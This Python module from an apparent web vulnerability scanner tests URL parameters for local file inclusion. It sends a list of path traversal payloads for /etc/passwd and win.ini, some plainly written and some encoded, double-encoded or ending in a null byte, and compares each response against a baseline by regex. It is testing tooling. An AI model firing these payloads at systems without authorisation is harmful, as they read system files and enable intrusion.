# SPDX-License-Identifier: Apache-2.0
# Copyright 2022-2026 Kaan Gültekin
"""Baseline-aware Unix and Windows file inclusion checks."""

import re

from requests import get
from requests.exceptions import RequestException

from modules.web.findings import emit, finding
from modules.web.http import scoped_get
from modules.web.query import parameter_indexes, probe_url, query_parts
from modules.web.runtime import begin_parameter, finish_parameter, parameter_done


def file_signatures(text):
    signatures = set()
    if re.search(r"(?:^|[\r\n>])root:[^:\r\n]*:0:0:[^:\r\n]*:[^:\r\n]+:[^<\r\n]+", text):
        signatures.add("Unix passwd entry")
    sections = re.findall(r"^\[(fonts|extensions|mci extensions|files)\]\s*$", text, re.I | re.M)
    if len(set(section.lower() for section in sections)) >= 2:
        signatures.add("Windows win.ini sections")
    return signatures


class LFIScanner:
    def __init__(self, log, console) -> None:
        self.log = log
        self.console = console
        self.tested_urls = set()
        self.findings = []
        self.confirmed_inputs = set()
        self.lfi_tests = [
            "../../../../../../etc/passwd", "/etc/passwd",
            "..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd",
            "..%252f..%252f..%252f..%252f..%252fetc/passwd",
            "....//....//....//....//etc/passwd",
            "../../../../../../etc/passwd%00",
            "../../../../../../windows/win.ini",
            r"..\..\..\..\..\..\windows\win.ini",
            "C:/Windows/win.ini",
        ]

    def exploit_lfi(self, base_url, url_params):
        original = f"{base_url}?{'&'.join(url_params)}"
        def input_key(index):
            return base_url, index, tuple(url_params[:index] + url_params[index + 1:]), url_params[index].split("=", 1)[0]
        indexes = [index for index in parameter_indexes(url_params)
                   if (original, index) not in self.tested_urls and input_key(index) not in self.confirmed_inputs and not parameter_done("lfi", original, index)]
        if not indexes:
            return []
        try:
            baseline = file_signatures(scoped_get(get, original).text)
        except RequestException:
            self.log.logger("error", f"Connection error raised on: {original}, skipping")
            return []
        found = []
        for index in indexes:
            revision = begin_parameter()
            self.tested_urls.add((original, index))
            for payload in self.lfi_tests:
                test_url = probe_url(base_url, url_params, index, payload)
                try:
                    new_signatures = file_signatures(scoped_get(get, test_url).text) - baseline
                    if not new_signatures:
                        continue
                    repeated = file_signatures(scoped_get(get, test_url).text) - baseline
                except RequestException:
                    self.log.logger("error", f"Connection error raised on: {test_url}, skipping")
                    break
                evidence = new_signatures & repeated
                if evidence:
                    result = finding("LFI", test_url, "Repeatable file content absent from the baseline: " + ", ".join(sorted(evidence)),
                                     parameter=url_params[index].split("=", 1)[0], severity="high",
                                     reproduction={"strategy": "file_inclusion", "requests": [
                                         {"url": original, "role": "baseline"}, {"url": test_url, "role": "probe"}, {"url": test_url, "role": "repeat"}]})
                    found.append(result)
                    self.confirmed_inputs.add(input_key(index))
                    emit(self.console, result)
                    break
            finish_parameter("lfi", original, index, revision)
        self.findings.extend(found)
        return found

    def test_lfi(self, url):
        base_url, params = query_parts(url)
        return self.exploit_lfi(base_url, params) if params else []
